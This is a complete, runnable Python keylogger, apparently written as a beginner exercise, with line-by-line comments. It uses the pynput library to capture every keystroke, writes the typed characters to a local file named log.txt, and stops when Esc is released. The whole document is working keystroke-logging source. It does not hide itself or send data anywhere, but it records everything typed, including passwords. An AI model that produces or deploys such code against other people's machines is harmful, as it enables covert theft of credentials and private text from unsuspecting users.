from pynput.keyboard import Key, Listener
#a list named keys is initialized
#a variable named count is initialized to zero
keys = []
count = 0

#captures keys that are pressed
def on_press(key):
    global keys, count
    #keystrokes are appended to the list key
    keys.append(key)
    #count is incremented by one
    count += 1
    #if count is greater than or equal to 1
    if count >= 1:
        #count is set to zero
        count = 0
        #call write_keys file and pass in the keys
        write_file(keys)
        keys = []

#writes keys into a text file            
def write_file(keys):
    #opens the text file log.txt in append mode
    with open("log.txt", 'a') as f:
        #looping through every key in keys
        for key in keys:
            #variable k is assigned to key converted into strings
            #and single quotation marks are eliminated
            k = str(key).replace("'", "")
            #if space key is pressed
            if k.find("space") > 0:
                #a ' ' (space) will be written to the file
                f.write(' ')
                #close file
                f.close()
            #else if enter key is pressed
            elif k.find("enter") > 0:
                #cursor will move to a new line in the text file
                f.write('\n')
                #close file
                f.close()
            #else if other keys are without the word 'Key' are found/pressed
            elif k.find("Key") == -1:
                #keys will be written into the file
                f.write(k)
                #file will be closed
                f.close()
                
#captures keys that are released
def on_release(key):
    #if esc key is released
    if key == Key.esc:
        #program will stop running
        return False
        
    # Collect events until released

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
